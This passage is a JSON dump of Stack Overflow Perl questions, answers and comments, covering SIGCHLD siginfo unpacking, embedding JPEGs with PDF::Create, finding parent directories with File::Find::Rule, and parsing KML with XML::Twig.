"accepted_answer_id": 37929924, "answer_count": 1, "score": 1, "last_activity_date": 1466453029, "creation_date": 1466448405, "question_id": 37929679, "link": "https://stackoverflow.com/questions/37929679/how-to-interpret-si-status-value", "title": "How to interpret si_status value", "body": "<p>I am working with perl signal handler function for SIGCHLD signal handler on Ubuntu system. \nIn order to get sa_siginfo I am unpacking binary data I get from sigaction.Now I am getting si_code as \"25\". Looking at <a href=\"http://man7.org/linux/man-pages/man2/sigaction.2.html\" rel=\"nofollow\">http://man7.org/linux/man-pages/man2/sigaction.2.html</a> how to interpret that? It says it is not bitmask but a value. \nOutput I am getting is :</p>\n\n<pre><code>in order : signo sicode sigval sigerro sigpid siuid siaddr sistatus siband 17 0 1 0 21225 0 0 25 0\n</code></pre>\n\n<p>Signo,pid are unpacked correctly, I verified.I do not understand how I get 25 as \"si_status\"</p>\n\n<pre><code>POSIX::sigaction(\n    POSIX::SIGCHLD,\n    POSIX::SigAction-&gt;new(\n        sub{\n         my $args = \\@_;\n         my $pid = unpack \"x16S\",$_[2];\n         my($signo,$sicode,$sigval,$sigerro,$sipid,$siuid,$siaddr,$sistatus,$siband) = unpack \"iiiiisssii\" ,$_[2];\n         print \"\\n in order : signo sicode sigval sigerro sigpid siuid siaddr sistatus siband \";\n         print (join (\" \", $signo, $sicode , $sigval , $sigerro  ,$sipid  ,$siuid  ,$siaddr  ,$sistatus  ,$siband));\n          }\n          0,\n          POSIX::SA_SIGINFO ),\n  );\n</code></pre>\n"}, {"tags": ["image", "perl", "pdf"], "answers": [{"tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": true, "score": 3, "last_activity_date": 1466448754, "last_edit_date": 1466448754, "creation_date": 1466448343, "answer_id": 37929659, "question_id": 37927877, "link": "https://stackoverflow.com/questions/37927877/insert-jpeg-image-in-pdf-using-perl-pdfcreate/37929659#37929659", "title": "Insert JPEG image in PDF using perl PDF::Create", "body": "<p>There are 2 issues with your code:</p>\n\n<ol>\n<li><code>$page[2]</code> is not defined, you need to run <code>$root-&gt;new_page()</code> again.</li>\n<li>the <code>image</code> method takes key value pairs, not ordered arguments.</li>\n</ol>\n\n<p>Here is an updated version which should work:</p>\n\n<pre><code>use warnings;\nuse strict;\n\nuse PDF::Create;\nuse PDF::Image::JPEG;\n\nprint \"PDF with Image\\n\";\n\n#Create\nmy $pdf = new PDF::Create(\n    'filename' =&gt; \"./image_embed_test.pdf\",\n    'Version'  =&gt; 1.2,\n    'PageMode' =&gt; 'UseNone',\n    'Author'   =&gt; 'Madhan',\n    'Title'    =&gt; 'My PDF',\n);\n\n# Prepare 2 fonts\nmy $f1 = $pdf-&gt;font('Subtype'  =&gt; 'Type1',\n                    'Encoding' =&gt; 'WinAnsiEncoding',\n                    'BaseFont' =&gt; 'Helvetica');\n\nmy $f2 = $pdf-&gt;font('Subtype'  =&gt; 'Type1',\n                    'Encoding' =&gt; 'WinAnsiEncoding',\n                    'BaseFont' =&gt; 'Helvetica-Bold');\n\nmy $root = $pdf-&gt;new_page('MediaBox' =&gt; [ 0, 0, 612, 792 ]);\n\nmy @page;\n$page[1]=$root-&gt;new_page;\n$page[1]-&gt;stringc($f2, 8, 306, 738, \"My First Page\");\n\n$page[2]=$root-&gt;new_page;\nmy $jpg1 = $pdf-&gt;image('./logo1.jpg');\n$page[2]-&gt;image( 'image'  =&gt; $jpg1, \n                 'xscale' =&gt; 0.2, \n                 'yscale' =&gt; 0.2, \n                 'xpos'   =&gt; 350,\n                 'ypos'   =&gt; 400 );\n\n$pdf-&gt;close;\n</code></pre>\n\n<p><a href=\"http://search.cpan.org/~manwar/PDF-Create-1.32/lib/PDF/Create/Page.pm#image(%25params)\" rel=\"nofollow\">perldoc PDF::Create::Page image()</a></p>\n"}], "owner": {"reputation": 1263, "user_id": 696264, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/c3fa04fd8c4245eac2d015a26674bc18?s=128&d=identicon&r=PG", "display_name": "Madhan", "link": "https://stackoverflow.com/users/696264/madhan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 829, "favorite_count": 0, "accepted_answer_id": 37929659, "answer_count": 1, "score": 3, "last_activity_date": 1466448754, "creation_date": 1466441540, "question_id": 37927877, "link": "https://stackoverflow.com/questions/37927877/insert-jpeg-image-in-pdf-using-perl-pdfcreate", "title": "Insert JPEG image in PDF using perl PDF::Create", "body": "<p>I am trying to insert a JPEG image in PDF file using perl program. \nI am using the PDF::Create module. </p>\n\n<p>I have tried with PDF::Image::JPEG module, which results \n\"Can't call method \"image\" on an undefined value at ./PDF_IMG.pl\"</p>\n\n<p>Could anyone please assist/advise to add the image in PDF using PDF::Create or PDF::Image::JPEG.</p>\n\n<p>The below is the code snippet I am using.</p>\n\n<pre><code>use strict;\nuse Data::Dumper;\nuse PDF::Create;\nuse PDF::Image::JPEG;\n\nprint \"PDF with Image\\n\";\n\n#Create\nmy $pdf = new PDF::Create('filename' =&gt; \"./image_embed_test.pdf\",\n                             'Version'  =&gt; 1.2,\n                             'PageMode' =&gt; 'UseNone',\n                             'Author'   =&gt; 'Madhan',\n                             'Title'    =&gt; 'My PDF',\n                         );\n\n   # Prepare 2 fonts\n  my $f1 = $pdf-&gt;font('Subtype'  =&gt; 'Type1',\n                        'Encoding' =&gt; 'WinAnsiEncoding',\n                        'BaseFont' =&gt; 'Helvetica');\n  my $f2 = $pdf-&gt;font('Subtype'  =&gt; 'Type1',\n                        'Encoding' =&gt; 'WinAnsiEncoding',\n                        'BaseFont' =&gt; 'Helvetica-Bold');\n\n\n\nmy $root = $pdf-&gt;new_page('MediaBox' =&gt; [ 0, 0, 612, 792 ]);\n\nmy @page;\n$page[1]=$root-&gt;new_page;\n\n$page[1]-&gt;stringc($f2, 8, 306, 738, \"My First Page\");\n\nmy $image1 = new PDF::Image::JPEG('./logo1.jpg');\n$page[2]-&gt;image($image1, 100, 100, 1, 2, 1.0, 1.0 ,0, 0, 0);\n\n$pdf-&gt;close;\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 89, "user_id": 4276338, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/3rwWa.jpg?s=128&g=1", "display_name": "Xanthoula Atsalaki", "link": "https://stackoverflow.com/users/4276338/xanthoula-atsalaki"}, "edited": false, "score": 0, "creation_date": 1466440779, "post_id": 37927608, "comment_id": 63305904, "body": "I think there is the same question and its answer here <a href=\"http://stackoverflow.com/questions/4318769/perl-get-parent-folder-name\" title=\"perl get parent folder name\">stackoverflow.com/questions/4318769/perl-get-parent-folder-n&zwnj;&#8203;ame</a> ."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1466441504, "post_id": 37927608, "comment_id": 63306386, "body": "The name of the language is &quot;Perl&quot;, not &quot;PERL&quot;. It&#39;s not an acronym; it&#39;s an intentional misspelling of &quot;Pearl&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 0, "creation_date": 1466445361, "post_id": 37927916, "comment_id": 63308404, "body": "Awesome!  Thanks!  Just as an FYI, As I said before I&#39;m new to Perl so I&#39;m not sure if this has to do with the version of Perl I have installed on my computer, but I had to change -&gt;dir to -&gt;directory to make it work.  Thanks for the quick answer ikegami!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 0, "creation_date": 1466446222, "post_id": 37927916, "comment_id": 63308846, "body": "My mistake. Fixed."}, {"owner": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 0, "creation_date": 1466522366, "post_id": 37927916, "comment_id": 63345597, "body": "Just as a note to other users planning on using the File::Find::Rule library, this will most likely to fail (as it did in my case) if your directories contain many nested folders.  File::Find::Rule seems to have difficulty traversing back to the directory I specified in -&gt;in($path) flag.  In my case, I happened to have roughly 10+ nested folders in the path i provided.  Otherwise, it&#39;s a solid solution.  It worked perfectly in my test program, just not in the actual scenario I was hoping for..  :("}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 0, "creation_date": 1466523610, "post_id": 37927916, "comment_id": 63346537, "body": "I think you misdiagnosed the issue. Are you sure it&#39;s not hitting some kind of path length limit (240 in Windows)? As you can see by the code I added to my answer, it can handle deep dirs without problem."}, {"owner": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 0, "creation_date": 1466533911, "post_id": 37927916, "comment_id": 63352488, "body": "Ah, I forgot about that path length limit on windows (I&#39;m a mac user)...  it looks like it might&#39;ve hit that character limit, but from the logs, it seems like File::Find::Rule is using &#39;cd ../../.. etc&quot; to traverse back.  I&#39;m positive this won&#39;t trigger the character limit violation.  But you&#39;re right, it does make sense that that&#39;s the reason why it&#39;s failing at long paths. I&#39;ll have to look into it further.  Regardless, if this is the case, Windows users will have trouble using this Library in the scenario I specified above."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "edited": false, "score": 1, "creation_date": 1466534732, "post_id": 37927916, "comment_id": 63353040, "body": "ug, didn&#39;t realize it used File::Find&#39;s default chdir behaviour, which makes it susceptible to permission issues and possibly others. You could try specifying <code>-&gt;extras({ no_chdir =&gt; 1 })</code>"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 7, "last_activity_date": 1466523577, "last_edit_date": 1466523577, "creation_date": 1466441636, "answer_id": 37927916, "question_id": 37927608, "link": "https://stackoverflow.com/questions/37927608/perl-how-do-i-find-a-parent-folder-of-a-known-subfolder/37927916#37927916", "title": "Perl: How do I find a parent folder of a known subfolder?", "body": "<pre><code>use File::Find::Rule qw( );\n\nmy @matches =\n   File::Find::Rule\n      -&gt;name(qw( A B C D ))\n      -&gt;directory\n      -&gt;in('.');\n</code></pre>\n\n<hr>\n\n<p>It handles deep dir just fine.</p>\n\n<pre><code>$ mkdir -p a/b/c/d/e/f/g/h/i/j/k/l\n\n$ touch a/b/c/d/e/f/g/h/i/j/k/l/file\n\n$ mkdir -p 0/1/2/3/4/5/6/7/8/9\n\n$ touch 0/1/2/3/4/5/6/7/8/9/file\n\n$ perl -MFile::Find::Rule -E'say for File::Find::Rule-&gt;in(\".\")'\n.\na\na/b\na/b/c\na/b/c/d\na/b/c/d/e\na/b/c/d/e/f\na/b/c/d/e/f/g\na/b/c/d/e/f/g/h\na/b/c/d/e/f/g/h/i\na/b/c/d/e/f/g/h/i/j\na/b/c/d/e/f/g/h/i/j/k\na/b/c/d/e/f/g/h/i/j/k/l\na/b/c/d/e/f/g/h/i/j/k/l/file\n0\n0/1\n0/1/2\n0/1/2/3\n0/1/2/3/4\n0/1/2/3/4/5\n0/1/2/3/4/5/6\n0/1/2/3/4/5/6/7\n0/1/2/3/4/5/6/7/8\n0/1/2/3/4/5/6/7/8/9\n0/1/2/3/4/5/6/7/8/9/file\n</code></pre>\n"}], "owner": {"reputation": 502, "user_id": 5215641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f736b3f0f80310b99ae1ebbd840041?s=128&d=identicon&r=PG&f=1", "display_name": "James Goe", "link": "https://stackoverflow.com/users/5215641/james-goe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 282, "favorite_count": 0, "accepted_answer_id": 37927916, "answer_count": 1, "score": 4, "last_activity_date": 1466523577, "creation_date": 1466440598, "last_edit_date": 1466455569, "question_id": 37927608, "link": "https://stackoverflow.com/questions/37927608/perl-how-do-i-find-a-parent-folder-of-a-known-subfolder", "title": "Perl: How do I find a parent folder of a known subfolder?", "body": "<p>I'm new to Perl and I'm having some trouble getting a parent folder of a known sub-folder(s).\nSo I have a list of subfolders, let's say A, B, C, D, etc.\nI know they are all scattered around in folders labeled (for eg.), 1, 2, 3, 4, etc.</p>\n\n<p>So it can be like this:\n1/A\n1/B\n2/C\n3/D\n3/E\netc.</p>\n\n<p>I just want to iterate through each folder and find it's direct parent directory.  Any ideas?</p>\n\n<p>EDIT:  Changed PERL to Perl :P</p>\n"}, {"tags": ["perl", "kml"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1466438459, "post_id": 37926858, "comment_id": 63304506, "body": "Sample data would help massively giving you an answer."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466438591, "post_id": 37926858, "comment_id": 63304583, "body": "How is the printing and Data::Dumper part related to parsing another file?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1466438627, "post_id": 37926858, "comment_id": 63304605, "body": "Your code doesn&#39;t read any file constantly. What exactly is your problem?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1466438994, "post_id": 37926858, "comment_id": 63304864, "body": "What is a KML file? I&#39;m thinking of the files that Google Earth uses, but they don&#39;t have Document and Folder elements. Data::Dumper isn&#39;t doing any parsing here, that&#39;s XML::Simple.  I&#39;m afraid you haven&#39;t done a very good job of explaining what you want to do."}, {"owner": {"reputation": 25, "user_id": 6464072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/388076be4b1c0d6f27ae81f377db7e09?s=128&d=identicon&r=PG&f=1", "display_name": "jpjy", "link": "https://stackoverflow.com/users/6464072/jpjy"}, "edited": false, "score": 0, "creation_date": 1466439384, "post_id": 37926858, "comment_id": 63305113, "body": "i apologise. Basically, when i was learning how to parse the file, most of the sample codes i saw used data::dumper to print out the data. However, in my case, i will need to read the file later(this is the first part of my project ), and i read that this is inadvisable for data::dumper. Therefore, i was wondering if there was a better way to print out the parsed data."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1466439703, "post_id": 37926858, "comment_id": 63305312, "body": "Show us (a sample of) the data you&#39;re parsing. Almost certainly is the answer."}, {"owner": {"reputation": 25, "user_id": 6464072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/388076be4b1c0d6f27ae81f377db7e09?s=128&d=identicon&r=PG&f=1", "display_name": "jpjy", "link": "https://stackoverflow.com/users/6464072/jpjy"}, "edited": false, "score": 0, "creation_date": 1466440870, "post_id": 37926858, "comment_id": 63305968, "body": "Added sample data. Basically im interested in getting data of the manholes. My script is able to get it, but i read that data::dumper is a bad choice if you need to read the script again, which i will need to do at a later part. therefore i was wondering if there are any better ways to print the data"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1466441784, "post_id": 37926858, "comment_id": 63306554, "body": "OK. And what&#39;s the desired output?"}, {"owner": {"reputation": 25, "user_id": 6464072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/388076be4b1c0d6f27ae81f377db7e09?s=128&d=identicon&r=PG&f=1", "display_name": "jpjy", "link": "https://stackoverflow.com/users/6464072/jpjy"}, "edited": false, "score": 1, "creation_date": 1466441900, "post_id": 37926858, "comment_id": 63306631, "body": "&quot;Manhole1&quot; =&gt; {                    Point =&gt; { coordinates =&gt; &quot;111.11111,111.111111&quot; },                    styleUrl =&gt; &quot;#blueCircle&quot;,                  },   &quot;Manhole2&quot; =&gt; {                    Point =&gt; { coordinates =&gt; &quot;111.444444,3.2222222&quot; },                    styleUrl =&gt; &quot;#blueCircle&quot;,                  }, -- my current output is something like this, which is fine. Though my desired output would be some like :                              Manhole1 : coordinates: xxxxx"}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 1, "last_activity_date": 1466442350, "last_edit_date": 1495541293, "creation_date": 1466438628, "answer_id": 37927038, "question_id": 37926858, "link": "https://stackoverflow.com/questions/37926858/how-to-parse-a-kml-file-without-using-datadumper-to-print-outputparsed-data/37927038#37927038", "title": "How to parse a kml file without using Data::Dumper to print output(parsed data)", "body": "<p>A better solution would be - <a href=\"https://stackoverflow.com/questions/33267765/why-is-xmlsimple-discouraged\">don't use <code>XML::Simple</code></a> </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings; \n\nuse XML::Twig; \n\nopen ( my $output, '&gt;', 'output1.txt' ) or die $!;\nprint {$output} XML::Twig -&gt; parsefile ( 'test1.kml' ) -&gt; get_xpath('//Folder/Folder',0)-&gt;text, \"\\n\"\n</code></pre>\n\n<p>Is a best guess at solving your problem, in lieu of actual data, and example output. </p>\n\n<p>With some data, something like this will do it - I think. Your <code>XML</code> is broken, so I'm not 100% sure (I may have a go at fixing it later).</p>\n\n<pre><code>#!usr/bin/perl\nuse strict;\nuse warnings;\n\nuse XML::Twig;\n\nmy $twig = XML::Twig -&gt; parsefile('input.kml'); \n\nforeach my $placemark ( $twig -&gt; get_xpath('//PlaceMark') ) {\n    next unless $placemark -&gt; first_child_text('name') =~ m/Manhole/;  \n    print join ( \",\", ( map { $placemark -&gt; get_xpath($_) -&gt; text } qw ( name .//coordinates .//styleUrl ))),\"\\n\"; \n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 6464072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/388076be4b1c0d6f27ae81f377db7e09?s=128&d=identicon&r=PG&f=1", "display_name": "jpjy", "link": "https://stackoverflow.com/users/6464072/jpjy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 170, "favorite_count": 0, "accepted_answer_id": 37927038, "answer_count": 1, "score": 0, "last_activity_date": 1466442350, "creation_date": 1466438186, "last_edit_date": 1466440635, "question_id": 37926858, "link": "https://stackoverflow.com/questions/37926858/how-to-parse-a-kml-file-without-using-datadumper-to-print-outputparsed-data", "title": "How to parse a kml file without using Data::Dumper to print output(parsed data)", "body": "<p>I am fairly new to perl and i am using perl to parse a kml file. The code I am using works. However, i am currently using data::dumper to print the parsed to a file, which makes it troublesome since i have to read the file later. I was wondering if there was a better solution?\nHere is my code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse XML::Simple;\nuse Data::Dumper;\n\nopen (OUTPUT1,\"&gt;output1.txt\");\nmy $xml = new XML::Simple;\nmy $data = $xml-&gt;XMLin(\"test1.kml\");\n\nprint OUTPUT1 Dumper($data-&gt;{Document}-&gt;{Folder}-&gt;{Folder});\n</code></pre>\n\n<p>here is the sample data:</p>\n\n<pre><code>    &lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?&gt;\n&lt;kml xmlns=\"http://www.opengis.net/kml/2.2\"&gt;\n  &lt;Document&gt;\n  &lt;name&gt;name&lt;/name&gt;\n  &lt;open&gt;1&lt;/open&gt;\n  &lt;Style id=\"redStar\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;color&gt;FFFFFF00&lt;/color&gt;\n    &lt;scale&gt;0.7&lt;/scale&gt;\n    &lt;Icon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/shapes/donut.png&lt;/href&gt;\n    &lt;/Icon&gt;\n  &lt;/IconStyle&gt;\n  &lt;LabelStyle&gt;\n    &lt;scale&gt;1.5&lt;/scale&gt;\n  &lt;/LabelStyle&gt;\n&lt;/Style&gt;\n&lt;Style id=\"yellowCircle\" xmlns=\"\"&gt;\\\n    &lt;IconStyle&gt;&lt;color&gt;FF66FF00&lt;/color&gt;&lt;scale&gt;0.7&lt;/scale&gt;&lt;Icon&gt;     &lt;href&gt;http://maps.google.com/mapfiles/kml/shapes/square.png&lt;/href&gt;&lt;/Icon&gt;    &lt;/IconStyle&gt;&lt;LabelStyle&gt;&lt;scale&gt;0.8&lt;/scale&gt;&lt;/LabelStyle&gt;&lt;/Style&gt;\n&lt;Style id=\"whiteCircle\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;color&gt;FF0000AA&lt;/color&gt;\n    &lt;scale&gt;0.7&lt;/scale&gt;\n    &lt;Icon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/wht-circle.png&lt;/href&gt;\n    &lt;/Icon&gt;\n  &lt;/IconStyle&gt;\n  &lt;LabelStyle&gt;\n    &lt;scale&gt;0.8&lt;/scale&gt;\n  &lt;/LabelStyle&gt;\n&lt;/Style&gt;\n&lt;Style id=\"s_ylw-pushpin\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;scale&gt;0.7&lt;/scale&gt;\n    &lt;Icon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/grn-diamond.png&lt;/href&gt;\n    &lt;/Icon&gt;\n    &lt;hotSpot x=\"32\" y=\"1\" xunits=\"pixels\" yunits=\"pixels\" /&gt;\n  &lt;/IconStyle&gt;\n  &lt;ListStyle&gt;\n    &lt;ItemIcon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/grn-diamond-lv.png&lt;/href&gt;\n    &lt;/ItemIcon&gt;\n  &lt;/ListStyle&gt;\n&lt;/Style&gt;\n&lt;Style id=\"s_ylw-pushpin_hl\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;scale&gt;0.827273&lt;/scale&gt;\n    &lt;Icon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/grn-diamond.png&lt;/href&gt;\n    &lt;/Icon&gt;\n    &lt;hotSpot x=\"32\" y=\"1\" xunits=\"pixels\" yunits=\"pixels\" /&gt;\n  &lt;/IconStyle&gt;\n  &lt;ListStyle&gt;\n    &lt;ItemIcon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/grn-diamond-    lv.png&lt;/href&gt;\n    &lt;/ItemIcon&gt;\n  &lt;/ListStyle&gt;\n&lt;/Style&gt;\n&lt;Style id=\"blueCircle\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;color&gt;FF0000FF&lt;/color&gt;\n    &lt;scale&gt;1.0&lt;/scale&gt;\n    &lt;Icon&gt;\n                    &lt;href&gt;http://maps.google.com/mapfiles/kml/shapes/placemark_square.png&lt;/href&gt;\n    &lt;/Icon&gt;\n  &lt;/IconStyle&gt;\n  &lt;LabelStyle&gt;\n    &lt;scale&gt;0.8&lt;/scale&gt;\n  &lt;/LabelStyle&gt;\n&lt;/Style&gt;\n&lt;Style id=\"greenCircle\" xmlns=\"\"&gt;\n  &lt;IconStyle&gt;\n    &lt;scale&gt;0.7&lt;/scale&gt;\n    &lt;Icon&gt;\n      &lt;href&gt;http://maps.google.com/mapfiles/kml/paddle/grn-circle.png&lt;/href&gt;\n    &lt;/Icon&gt;\n  &lt;/IconStyle&gt;\n  &lt;LabelStyle&gt;\n    &lt;scale&gt;0.8&lt;/scale&gt;\n  &lt;/LabelStyle&gt;\n&lt;/Style&gt;\n&lt;Folder&gt;\n&lt;name&gt;Circuits&lt;/name&gt;\n  &lt;Folder&gt;\n    &lt;name&gt;Circuit&lt;/name&gt;\n    &lt;Folder&gt;\n      &lt;name&gt;Segment&lt;/name&gt;\n      &lt;Placemark&gt;\n        &lt;name&gt;Segment1&lt;/name&gt;\n        &lt;Style&gt;\n          &lt;LineStyle id=\"#20605123_ARFHC.Style\"&gt;\n            &lt;color&gt;FF00FF00&lt;/color&gt;\n            &lt;width&gt;2&lt;/width&gt;\n          &lt;/LineStyle&gt;\n        &lt;/Style&gt;\n        &lt;LineString&gt;\n          &lt;altitudeMode&gt;clampToGround&lt;/altitudeMode&gt;\n          &lt;coordinates&gt;000.00000,0.000000\n &lt;/coordinates&gt;\n        &lt;/LineString&gt;\n      &lt;/Placemark&gt;\n &lt;Folder&gt;\n      &lt;name&gt;Manhole&lt;/name&gt;\n      &lt;Placemark&gt;\n        &lt;name&gt;Manhole1&lt;/name&gt;\n        &lt;styleUrl&gt;#blueCircle&lt;/styleUrl&gt;\n        &lt;Point&gt;\n          &lt;coordinates&gt;111.11111,111.111111\n&lt;/coordinates&gt;\n            &lt;/Point&gt;\n          &lt;/Placemark&gt;\n          &lt;Placemark&gt;\n             &lt;name&gt;Manhole2&lt;/name&gt;\n            &lt;styleUrl&gt;#blueCircle&lt;/styleUrl&gt;\n            &lt;Point&gt;\n              &lt;coordinates&gt;111.444444,3.2222222\n&lt;/coordinates&gt;\n            &lt;/Point&gt;\n          &lt;/Placemark&gt;\n  &lt;/Folder&gt;\n      &lt;/Folder&gt;\n    &lt;/Folder&gt;\n  &lt;/Document&gt;\n&lt;/kml&gt;\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 93, "user_id": 4080377, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Yph2XH5YPG4/AAAAAAAAAAI/AAAAAAAAGdQ/iccviMciKaA/photo.jpg?sz=128", "display_name": "Tom Scanlan", "link": "https://stackoverflow.com/users/4080377/tom-scanlan"}, "edited": false, "score": 0, "creation_date": 1466435763, "post_id": 37925910, "comment_id": 63302632, "body": "This is coverd by grep in perl: <a href=\"http://stackoverflow.com/questions/3848360/how-can-i-implement-unix-grep-in-perl\" title=\"how can i implement unix grep in perl\">stackoverflow.com/questions/3848360/&hellip;</a>"}, {"owner": {"reputation": 1006, "user_id": 2369597, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yU383.jpg?s=128&g=1", "display_name": "Wad", "link": "https://stackoverflow.com/users/2369597/wad"}, "edited": false, "score": 0, "creation_date": 1466446522, "post_id": 37925910, "comment_id": 63308997, "body": "Great, downvoted for either not knowing perl (which I openly admit) or performing inadequate Google searches.  Thanks."}], "answers": [{"comments": [{"owner": {"reputation": 62184, "user_id": 7231, 